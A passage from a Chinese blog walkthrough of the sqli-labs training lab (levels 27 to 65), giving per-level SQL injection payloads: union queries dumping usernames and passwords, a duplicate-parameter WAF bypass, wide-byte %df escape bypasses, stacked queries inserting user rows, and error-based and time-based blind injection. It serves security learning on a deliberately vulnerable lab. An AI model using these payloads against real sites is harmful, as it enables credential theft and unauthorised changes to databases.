<p><strong>+表示匹配一次或多次，/i表示不区分大小写，所以整体表示匹配 union加一个或多个空格加select，其中union和select不区分大小，因此只能用重写绕过</strong></p> 
<pre><code class="language-php">?id=a')%0aunion%0aunion%0aselectselect%0a1,2,3;%00

?id=a')%0aunion%0aunion%0aselectselect%0a1,database(),3;%00

?id=a')%0aunion%0aunion%0aselectselect%0a1,2,group_concat(table_name)from(information_schema.tables)where(table_schema='security');%00

?id=a')%0aunion%0aunion%0aselectselect%0a1,2,group_concat(column_name)from(information_schema.columns)where(table_schema='security'and%0atable_name='users');%00

?id=a')%0aunion%0aunion%0aselectselect%0a1,2,group_concat(username,0x7e,password)from(users);%00

</code></pre> 
<h3 id="less-28a">less-28a</h3> 
<p><strong>这关与上一关一样，不再展示</strong></p> 
<h3 id="less-29"><strong>less-29</strong></h3> 
<p><strong>闭合方式为单引号闭合，并且可以用--+注释，用联合注入即可</strong></p> 
<pre><code class="language-php">?id=-1' union select 1,2,group_concat(username,0x7e,password)from users --+

//类似上述语句即可，与第一关类似</code></pre> 
<p><strong>但这一关不可能这么简单，于是看了其他大佬的wp发现参考：</strong><a href="https://blog.csdn.net/qq_44276741/article/details/107532555?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164648031916780261943242%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164648031916780261943242&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-107532555.es_vector_control_group&amp;utm_term=sql-lab29&amp;spm=1018.2226.3001.4187" title="Sqli-labs-Less-29 （笔记）_小鸣同学的博客-CSDN博客">Sqli-labs-Less-29 （笔记）_小鸣同学的博客-CSDN博客</a></p> 
<p><strong>这一关在web应用前有一个waf，在关卡列表界面直接点开是没有的，要在地址栏输入</strong></p> 
<p><img alt="" height="722" src="https://images2.imgbox.com/7c/f1/DFWHX3SL_o.png" width="1200"></p> 
<p><strong> </strong></p> 
<p><strong>      客户端在访问服务器端时，需要先经过一个tomcat服务器，这个tomcat服务器中部署的过滤代码充当了waf的功能。输入的参数经过tomcat服务器过滤后，再被传入到真正的服务端apache服务器上处理，然后逐层返回到客户端。</strong></p> 
<p><strong>      这里传入的参数只有一个，名为id，当我们强行传入两个名都为id的参数时，waf获取的是第一个参数，而忽略第二个参数，则对第二个参数的内容不做任何检查和过滤，这样第二个参数就可以传入到apache服务器端，进行解析。</strong><br>  </p> 
<p><strong>我们在url后面输入login.php进入到受waf保护的界面</strong></p> 
<pre><code class="language-php">?id=0&amp;id=-1' union select 1,2,database() --+

//第二个参数的语句与第一关类似
</code></pre> 
<p><strong>传入两个参数用<code>&amp;</code>符号隔开，第一个参数用于绕过waf，第二个参数则是传入apache服务器进行运行的注入代码。</strong></p> 
<p><img alt="" height="532" src="https://images2.imgbox.com/f8/99/ac0AKS8S_o.png" width="1200"></p> 
<h2 id="less-30">less-30</h2> 
<p><strong>与上一关类似，闭合方式为双引号闭合</strong></p> 
<p><img alt="" height="454" src="https://images2.imgbox.com/4d/17/M9N4YJWD_o.png" width="1200"></p> 
<pre><code class="language-php">?id=0&amp;id=-1' union select 1,2,database() --+</code></pre> 
<p><img alt="" height="510" src="https://images2.imgbox.com/09/08/WBF2iyC5_o.png" width="1200"></p> 
<h3 id="%C2%A0less-31"> less-31</h3> 
<p><strong>这一关只是变换了闭合方式为(" "),剩下与上一关一样</strong></p> 
<p><img alt="" height="514" src="https://images2.imgbox.com/b4/3d/XM7RLzC2_o.png" width="1200"></p> 
<h3 id="%C2%A0less-32"> less-32</h3> 
<p><strong>闭合方式为单引号闭合，这题涉及到了特殊字符的转义，对此我们先做相关的了解</strong></p> 
<p><strong>特殊字符转义与宽字节注入，常见的转义方式：</strong></p> 
<pre><code class="language-php">//1)自定义转义函数，比如：

function check_addslashes($string){

$string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);

//escape any backslash $string = preg_replace('/\'/i', '\\\'', $string);

//escape single quote with a backslash $string = preg_replace('/\"/', "\\\"", $string);

//escape double quote with a backslash return $string;

}

//2)调用函数 addslashes()

//3)调用函数 mysql_real_escape_string()</code></pre> 
<p><strong>它们都可能被宽字节注入绕过，原理如下：</strong></p> 
<pre><code class="language-php">以单引号'为例，它被转义为\'，我们的目标是去掉反斜杠，将'逃逸出来。现在我们不输入'，而是输入%df'，被转义后它变成：%df\'，也相当于%df%5c%27(%5c表示反斜杠\ )，之后在数据库查询前由于使用了GBK多字节编码，%df%5c会gbk编码转换成为汉字"運"，从而使得%27，也就是单引号逃逸。

宽字节注入与普通注入payload上的区别就是：在会被转义的字符前加上%df。</code></pre> 
<p><strong> 参考文章：</strong></p> 
<p><a class="link-info" href="https://blog.csdn.net/weixin_29466045/article/details/113209892?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=sql%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E8%BD%AC%E4%B9%89&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-113209892.nonecase&amp;spm=1018.2226.3001.4187" title="绕过mysql转义字符_SQL注入：各种绕过检测的姿势">绕过mysql转义字符_SQL注入：各种绕过检测的姿势</a></p> 
<pre><code class="language-php">?id=1%df' union select 1,2,database() --+

?id=1%df' union select 1,2,group_concat(username,0x7e,password)from users --+

//不再赘述</code></pre> 
<p><img alt="" height="540" src="https://images2.imgbox.com/d1/04/hu0B5vRz_o.png" width="1200"></p> 
<h3 id="less-33">less-33</h3> 
<p><strong>addslashes()函数：addslashes() 函数返回在预定义的字符前添加反斜杠的字符串。</strong></p> 
<p><strong>预定义字符是：</strong></p> 
<ul><li><strong>单引号（'）</strong></li><li><strong>双引号（"）</strong></li><li><strong>反斜杠（\）</strong></li><li><strong>NULL</strong></li></ul> 
<p><strong> 实际上与上一关相同，不再赘述</strong></p> 
<p><img alt="" height="454" src="https://images2.imgbox.com/b9/c1/OIHwBOZ5_o.png" width="1200"></p> 
<h3 id="%C2%A0less-34"> less-34</h3> 
<p><strong>这个题的绕过方式不太懂，借鉴一下大佬的想法</strong></p> 
<p><strong>发现，在url栏中输入 %df 主要是以 16进制形式输入，而在输入框输入 %df 则是以普通字符串输入的。（<span style="color:#fe2c24;">输入框的地方不理解</span>）</strong></p> 
<p><strong>绕过方法：有些汉字的编码为三个字节的编码，我们将三个字节拆开来看，前两个为一组，后面的那个和 \ 相编码为两字节绕过，从而使得单引号逃逸。</strong></p> 
<pre><code class="language-php">含' union select 1,group_concat(username,0x7e,password) from users#

//还有就是同hackbar的post传参，按照
//uname=admin%df' union select 1,2--+&amp;passwd=admin&amp;submit=Submit
//进行注入</code></pre> 
<p><img alt="" height="330" src="https://images2.imgbox.com/a7/4d/WcxiXP7i_o.png" width="1200"></p> 
<h3 id="%C2%A0less-35"> less-35</h3> 
<p><strong>这关依旧是addslashes函数绕过，但此id周围没有单引号或者双引号，直接简单联合注入即可</strong></p> 
<pre><code class="language-php">?id=-1 union select 1,2,database()--+

?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+

?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1)--+
//这里是多次查询语句的拼接

?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name='security'--+ //此处将'security'进行十六进制编码也可以绕过
//有疑问：为何该处的单引号前面+%df没用


?id=-1 union select 1,2,group_concat(username,0x7e,password)from users--+</code></pre> 
<p><img alt="" height="562" src="https://images2.imgbox.com/a0/11/9W19m9BC_o.png" width="1200"></p> 
<h3 id="%C2%A0less-36"> less-36</h3> 
<p><strong>mysql_real_escape_string()函数：转义在 SQL 语句中使用的字符串中的特殊字符。</strong></p> 
<p><strong>下列字符受影响：</strong></p> 
<ul><li><strong>\x00</strong></li><li><strong>\n</strong></li><li><strong>\r</strong></li><li><strong>\</strong></li><li><strong>’</strong></li><li><strong>"</strong></li><li><strong>\x1a</strong></li></ul> 
<p><strong>可以使用 %df 进行绕过</strong></p> 
<pre><code class="language-php">?id=-1%df' union select 1,2,group_concat(username,0x7e,password)from users--+

//其余同32关</code></pre> 
<p><img alt="" height="470" src="https://images2.imgbox.com/7d/bf/DqAWkPdY_o.png" width="1200"></p> 
<h3 id="%C2%A0less-37"> less-37</h3> 
<p><strong>这关与上一关不同之处在于参数提交方式，剩余与34关一样 </strong></p> 
<pre><code class="language-php">含' union select 1,2 #

含' union select 1,group_concat(username,0x7e,password)from users #</code></pre> 
<p><img alt="" height="274" src="https://images2.imgbox.com/c6/df/knV9IvVu_o.png" width="1200"></p> 
<h3 id="%C2%A0less-38"> less-38</h3> 
<p><strong>这关涉及到了堆叠注入，所以进行一下了解</strong></p> 
<pre><code class="language-php">mysli_multi_query()函数：

Stackedinjections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。

简单来说：mysqli_multi_query() 函数：执行一个或多个针对数据库的查询。多个查询用分号进行分隔。

我们就可以在普通注入的后面，写上一条任意的SQL语句，例如插入数据，或者删库。</code></pre> 
<pre><code class="language-php">?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+

?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+

//执行完上述语句，我们得知了列名，此时我们根据具体列名，进行sql查询，删除等语句的执行

?id=-1' ;insert into users(id,username,password)values(115,'1234','4567');
?id=-1' ;insert into users(id,username,password)values(100,'772211','112277');

随后执行?id=56，可以看到自己成功插入了密码用户名</code></pre> 
<p><img alt="" height="268" src="https://images2.imgbox.com/93/22/3eyRNn2g_o.png" width="1166"></p> 
<h3 id="%C2%A0less-39"> less-39</h3> 
<p><strong>与上关相同思路，只不过id改为整数即可，无闭合方式</strong></p> 
<p><img alt="" height="384" src="https://images2.imgbox.com/21/dd/fubZbJ5E_o.png" width="1200"></p> 
<h3 id="less-40">less-40</h3> 
<pre><code class="language-php">?id=-1%27)%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+
 
?id=-1%27)%20union%20select%201,group_concat(username,password),3%20from%20users%20--+

//上述是正常的联合注入，闭合方式为('')
//与上一关相同，亦可以堆叠注入</code></pre> 
<h3 id="%C2%A0less-41"> less-41</h3> 
<p><strong>也是堆叠注入，id为整数即可</strong></p> 
<h3 id="less-42"><strong>less-42</strong></h3> 
<p><strong>这一关的登录页面后端同样存在堆叠注入，因此思路是，通过堆叠注入，插入密码和用户名的语句，最后再用该用户名和密码登录页面即可</strong></p> 
<p><strong>因为账户进行了转义处理密码没有做处理，数据库没有使用gbk编码不能向上面一样使用宽字节注入，因此我们从密码框下手</strong></p> 
<pre><code class="language-php">' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users' #

//开始堆叠注入
1';insert into users(id,username,password)values(id,'111','222');#</code></pre> 
<p><img alt="" height="756" src="https://images2.imgbox.com/f8/4a/wtg1uwVw_o.png" width="1200"></p> 
<p><strong> 注入成功</strong><img alt="" height="712" src="https://images2.imgbox.com/46/d5/rI4AyB9v_o.png" width="1200"></p> 
<h3 id="%C2%A0less-43"> less-43</h3> 
<p><strong>与上一关相同，只将闭合方式改为('')即可</strong></p> 
<h3 id="less-44"><strong>less-44</strong></h3> 
<p><strong>这一关与42一样(插入语句时，页面虽然报错，但已经成功执行，可以登录验证)</strong></p> 
<pre><code class="language-php">1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #

'; insert into users(id,username,password)values(45,'123','321');#</code></pre> 
<p><img alt="" height="432" src="https://images2.imgbox.com/a0/7e/RadNHnxj_o.png" width="1200"></p> 
<p><img alt="" height="528" src="https://images2.imgbox.com/38/7b/x6LYZTlC_o.png" width="1200"></p> 
<h3 id="%C2%A0less-45"> less-45</h3> 
<p><strong>这一关闭合方式改为了(' ')剩下与上一关一样</strong></p> 
<h3 id="less-46"><strong>less-46</strong></h3> 
<p><strong>此关开始是order by注入</strong></p> 
<p><strong>首先了解order by参数注入：</strong></p> 
<p><strong>order by 注入是指其后面的参数是可控的</strong></p> 
<p><strong>order by 不同于我们在 where 后的注入点，不能使用 union 等注入，其后可以跟接 报错注入 或者 时间盲注</strong></p> 
<pre><code class="language-php">order by（存在于sql语句中）
?sort=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)

?sort=-1 and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password)from users limit 3,1),0x7e),1)

?sort=-1 and updatexml(1,concat(0x7e,(select concat_ws(username,':',password) from users limit 0,1),0x7e),1)
//这里有疑问，为何报用户名和密码的时候，用concat_ws不用group_concat，我发现前者用limit有效，后者没作用</code></pre> 
<p><img alt="" height="185" src="https://images2.imgbox.com/56/5f/wHLKkGtW_o.png" width="967"></p> 
<h3 id="%C2%A0less-47"> less-47</h3> 
<p><strong>这一关闭合方式改为单引号闭合，其余同上一关</strong></p> 
<pre><code class="language-php">?sort=-1' and updatexml(1,concat(0x7e,(select concat_ws(username,':',password) from users limit 0,1),0x7e),1)--+</code></pre> 
<p><img alt="" height="332" src="https://images2.imgbox.com/11/1c/i3VkZUaA_o.png" width="1200"></p> 
<h3 id="%C2%A0less-48"> less-48</h3> 
<p><strong>这一关没有报错回显，因此用时间注入</strong></p> 
<pre><code class="language-php">?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+

?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1) --+</code></pre> 
<h3 id="less-49">less-49</h3> 
<p><strong>同上一关，闭合方式为单引号</strong></p> 
<h3 id="less-50"><strong>less-50</strong></h3> 
<p><strong>堆叠注入与order by的结合</strong></p> 
<p><img alt="" height="406" src="https://images2.imgbox.com/ff/03/3iiRH6DC_o.png" width="1200"></p> 
<pre><code class="language-php">?sort=1;insert into users(id,username,password)values(46,'101','101'); --+</code></pre> 
<h3 id="%C2%A0less-51"> less-51</h3> 
<p><strong>改为单引号即可</strong></p> 
<p><img alt="" height="411" src="https://images2.imgbox.com/d0/03/xojsupJ5_o.png" width="1200"></p> 
<h3 id="%C2%A0less-52"> less-52</h3> 
<p><strong>这关依旧是时间注入，同时又堆叠注入</strong></p> 
<pre><code class="language-php">?sort=1;insert into users(id,username,password)values(99,'721','721'); --+</code></pre> 
<p><img alt="" height="364" src="https://images2.imgbox.com/4b/cd/8Def1J2F_o.png" width="1200"></p> 
<h3 id="%C2%A0less-53"> less-53</h3> 
<p><strong>这一关同上一关，闭合方式为单引号即可</strong></p> 
<h3 id="less-54"><strong>less-54</strong></h3> 
<p><strong>我们只能输入十次语句，十次语句时候该靶场就会对里面所有的库名，表名，列名进行一个刷新。</strong></p> 
<pre><code class="language-php">?id=-1' union select 1,2,database()--+

?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+

?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='x8lj8smowb'--+</code></pre> 
<p><img alt="" height="460" src="https://images2.imgbox.com/6a/c8/QjvyrMsH_o.png" width="1200"></p> 
<p><img alt="" height="462" src="https://images2.imgbox.com/f3/f0/lhxu2cje_o.png" width="1200"></p> 
<p><strong> 访问可能性大的<span style="color:#ffff00;"><span style="color:#00ffff;">secret_35GP</span></span></strong></p> 
<pre><code class="language-php">?id=-1' union select 1,2,group_concat(secret_35GP)from x8lj8smowb--+</code></pre> 
<p><img alt="" height="463" src="https://images2.imgbox.com/dc/b9/IPoTI0jy_o.png" width="1200"></p> 
<p><strong> 提交IP得：</strong></p> 
<p><img alt="" height="326" src="https://images2.imgbox.com/c8/a9/LvZS5Efd_o.png" width="1200"></p> 
<h3 id="less-55">less-55</h3> 
<p><strong>这一关闭合方式为()，其余同上一关</strong></p> 
<pre><code class="language-php">?id=-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+
</code></pre> 
<h3 id="less-56">less-56</h3> 
<p><strong>闭合方式为(''),其余同上</strong></p> 
<h3 id="less-57">less-57</h3> 
<p><strong>查看到源码，闭合方式为双引号闭合</strong></p> 
<p><img alt="" height="179" src="https://images2.imgbox.com/af/e7/4tSzoui0_o.png" width="836"></p> 
<h3 id="%C2%A0less-58"> less-58</h3> 
<p><strong>因为该关卡的数据不是直接数据库里面取得，而是在一个数组里面取出得。所以联合注入是不行得。但是有报错显示，所以可以使用报错注入。</strong></p> 
<pre><code class="language-php">?id=-1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+

?id=-1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()),0x7e),1) --+

?id=-1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='dmmxvync29' limit 2,1),0x7e),1) --+

?id=-1' and updatexml(1,concat(0x7e,(select secret_H1H8 from dmmxvync29),0x7e),1) --+</code></pre> 
<p><img alt="" height="306" src="https://images2.imgbox.com/68/cd/yGNNQZJC_o.png" width="883"></p> 
<p> <img alt="" height="241" src="https://images2.imgbox.com/8a/b5/vjABQ579_o.png" width="1004"></p> 
<h3 id="%C2%A0less-59"> less-59</h3> 
<p><strong>与上一关一样</strong></p> 
<h3 id="less-60"><strong>less-60</strong></h3> 
<p><strong>与58一样，闭合方式改为("")即可</strong></p> 
<h3 id="less-61"><strong>less-61</strong></h3> 
<p><strong>同上，闭合方式改为((''))即可</strong></p> 
<h3 id="less-62"><strong>less-62</strong></h3> 
<p><strong>这关联合注入与报错都不能用，用盲注入吧</strong></p> 
<pre><code class="language-php">?id=1') and if(length((select database()))=10,sleep(5),1)--+  时间注入，如果出现延迟表示该数据库名长度是10 
 
 
?id=1')and length((select database()))=10--+  布尔盲注</code></pre> 
<h3 id="less-63">less-63</h3> 
<p><strong>闭合方式为单引号闭合，其余同上</strong></p> 
<h3 id="less-64"><strong>less-64</strong></h3> 
<p><strong>闭合方式为(())</strong></p> 
<h3 id="less-65"><strong>less-65</strong></h3> 
<p><strong>闭合方式为("")</strong></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/a7f31b058fafefeafa8d7a50edbb2f25/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">centos安装rocketmq</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/03bb89e7586d091342b25aa2f8a10b19/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">C语言中“##“的用法介绍</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>